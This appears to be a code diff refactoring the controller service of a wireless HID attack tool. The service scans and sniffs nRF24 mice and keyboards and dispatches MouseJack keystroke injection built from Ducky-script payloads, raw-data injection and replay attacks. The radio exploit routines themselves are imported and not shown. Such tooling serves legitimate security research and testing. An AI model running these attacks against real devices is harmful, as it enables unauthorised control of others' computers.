@@ -1,21 +1,21 @@
 import queue
 import threading
 import multiprocessing as mp
-from typing import Dict, Any, Set, Tuple
+from typing import Dict, Any
 from usbmonitor import USBMonitor
 from usbmonitor.attributes import ID_MODEL_ID, ID_VENDOR_ID
-from Script.Device.USB.NRF24Research.mousejack import *
-from Script.Globals import FingerprintRegistry
+
 from Script.Data import Formatter
+from Script.Device.Operator.USB import *
+from Script.Device.Operator.Payload import *
 
 
 class Service(mp.Process):
-    def __init__(self, cmd_queue: mp.Queue, evt_queue: mp.Queue,
-                 vid_pid_set: Optional[Set[Tuple[str, str]]] = None):
+    def __init__(self, cmd_queue: mp.Queue, evt_queue: mp.Queue):
         super().__init__()
         self.cmd_queue = cmd_queue
         self.evt_queue = evt_queue
-        self.vid_pid_set = {(vid.lower(), pid.lower()) for vid, pid in vid_pid_set} if vid_pid_set else None
+        self.vid_pid_set = DriverRegistry.discover_vid_pid_set()
         self.daemon = True
         self.monitor = None
         self.data_ft = Formatter()
@@ -44,6 +44,7 @@ class Service(mp.Process):
             self.monitor.stop_monitoring()
 
     def cmd_proc_loop(self):
+        latest_id = None
         try:
             while True:
                 try:
@@ -54,6 +55,7 @@ class Service(mp.Process):
                         if cmd_type == 'scan_start':
                             self.stop_action(physical_id)
                             self.start_scan(vid, pid, physical_id)
+                            latest_id = physical_id
                         elif cmd_type == 'attack_start':
                             self.stop_action(physical_id)
                             payload = cmd['payload']
@@ -62,8 +64,13 @@ class Service(mp.Process):
                             parse = cmd['parse']
                             language = cmd['language']
                             self.start_attack(vid, pid, physical_id, payload, mode, parse, targets, language)
+                            latest_id = physical_id
                         elif cmd_type == 'scan_stop' or cmd_type == 'attack_stop':
                             self.stop_action(physical_id)
+                        elif cmd_type == 'reload_device':
+                            if latest_id:
+                                self.stop_action(latest_id)
+                            self.reload_device()
                     else:
                         self.device_event('offline', cmd['vid'], cmd['pid'])
                 except queue.Empty:
@@ -72,6 +79,9 @@ class Service(mp.Process):
                     self.error_report('Command Error', e)
         except Exception as e:
             self.error_report('Error', e)
+
+    def reload_device(self):
+        self.vid_pid_set = DriverRegistry.discover_vid_pid_set()
 
     def on_device_connected(self, device_id: str, device_info: Dict[str, Any]):
         vid = device_info.get(ID_VENDOR_ID, '').lower()
@@ -108,8 +118,6 @@ class Service(mp.Process):
                 }
             )
         )
-
-    # execute attack and launch attack method would be moved to another individual script sooner
 
     def start_scan(self, vid, pid, physical_id):
         if physical_id in self.action_threads:
@@ -202,20 +210,20 @@ class Service(mp.Process):
             }
 
     def scan(self, vid, pid, physical_id, stop_event):
-        mj = MouseJack()
+        scanner = Predator(vid, pid)
         device_count = 0
         last_data = {}
         try:
             while not stop_event.is_set():
-                mj.scan()
+                scanner.scan()
                 if stop_event.is_set():
                     break
-                if mj.devices:
-                    if device_count >= len(mj.devices):
+                if scanner.devices:
+                    if device_count >= len(scanner.devices):
                         device_count = 0
 
-                    addr = list(mj.devices.keys())[device_count]
-                    current_info = mj.devices[addr]
+                    addr = list(scanner.devices.keys())[device_count]
+                    current_info = scanner.devices[addr]
                     is_new_data = False
 
                     if addr not in last_data:
@@ -242,8 +250,8 @@ class Service(mp.Process):
                                            report
                                            )
 
-                    mj.sniff(0.1, addr)
-                    if device_count + 1 < len(mj.devices):
+                    scanner.sniff(0.1, addr)
+                    if device_count + 1 < len(scanner.devices):
                         device_count += 1
                     else:
                         device_count = 0
@@ -260,13 +268,13 @@ class Service(mp.Process):
                 'target_channels': '',
                 'target_hid': '',
             })
-            mj.close()
+            scanner.close()
 
     def mousejack_attack(self, vid, pid, physical_id, targets, mal_cmd, language, stop_event):
-        mj = MouseJack()
+        attacker = Predator(vid, pid)
         try:
-            mal_code = duckyparser.DuckyParser(mal_cmd, language).parse()
-            mj.mousejack(targets, mal_code)
+            mal_code = DuckyParser(mal_cmd, language).parse()
+            attacker.mousejack(targets, mal_code)
         except Exception as e:
             self.error_report('Mousejack Attack Failed', e)
         finally:
@@ -274,16 +282,16 @@ class Service(mp.Process):
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Mousejack',
                 'payload': f'{mal_cmd}',
-                'target_address': mj.report_address(targets),
-                'target_channels': mj.report_channels(targets),
-                'target_hid': mj.report_hid(targets)
+                'target_address': attacker.report_address(targets),
+                'target_channels': attacker.report_channels(targets),
+                'target_hid': attacker.report_hid(targets)
             })
-            mj.close()
+            attacker.close()
 
     def rawdata_attack(self, vid, pid, physical_id, targets, payload, stop_event):
-        mj = MouseJack()
+        attacker = Predator(vid, pid)
         try:
-            mj.attack_with_rawdata(targets, payload)
+            attacker.attack_with_rawdata(targets, payload)
         except Exception as e:
             self.error_report('Rawdata Attack Failed', e)
         finally:
@@ -291,17 +299,17 @@ class Service(mp.Process):
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Rawdata',
                 'payload': f'{payload}',
-                'target_address': mj.report_address(targets),
-                'target_channels': mj.report_channels(targets),
-                'target_hid': mj.report_hid(targets)
+                'target_address': attacker.report_address(targets),
+                'target_channels': attacker.report_channels(targets),
+                'target_hid': attacker.report_hid(targets)
             })
-            mj.close()
+            attacker.close()
 
     def replay_attack(self, vid, pid, physical_id, targets, stop_event):
-        rp = Replayer()
+        attacker = Predator(vid, pid)
         try:
             while not stop_event.is_set():
-                rp.replay(targets)
+                attacker.replay(targets)
                 time.sleep(0.01)
         except Exception as e:
             self.error_report('Replay Attack Failed', e)
@@ -309,18 +317,18 @@ class Service(mp.Process):
             self.action_report('atk_fin', physical_id, vid, pid, {}, {
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Replay',
-                'payload': rp.get_payload(targets),
-                'target_address': rp.report_address(targets),
-                'target_channels': rp.report_channels(targets),
+                'payload': attacker.get_payload(targets),
+                'target_address': attacker.report_address(targets),
+                'target_channels': attacker.report_channels(targets),
                 'target_hid': ''
             })
-            rp.close()
+            attacker.close()
 
     def replay_rawdata(self, vid, pid, physical_id, targets, payload, stop_event):
-        rp = Replayer()
+        attacker = Predator(vid, pid)
         try:
             while not stop_event.is_set():
-                rp.attack_with_rawdata(targets, payload)
+                attacker.attack_with_rawdata(targets, payload)
                 time.sleep(0.01)
         except Exception as e:
             self.error_report('Replay Attack Failed', e)
@@ -329,11 +337,11 @@ class Service(mp.Process):
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Replay',
                 'payload': f'{payload}',
-                'target_address': rp.report_address(targets),
-                'target_channels': rp.report_channels(targets),
+                'target_address': attacker.report_address(targets),
+                'target_channels': attacker.report_channels(targets),
                 'target_hid': ''
             })
-            rp.close()
+            attacker.close()
 
     def action_report(self, action, physical_id, vid, pid, info, report):
         self.evt_queue.put((action, {
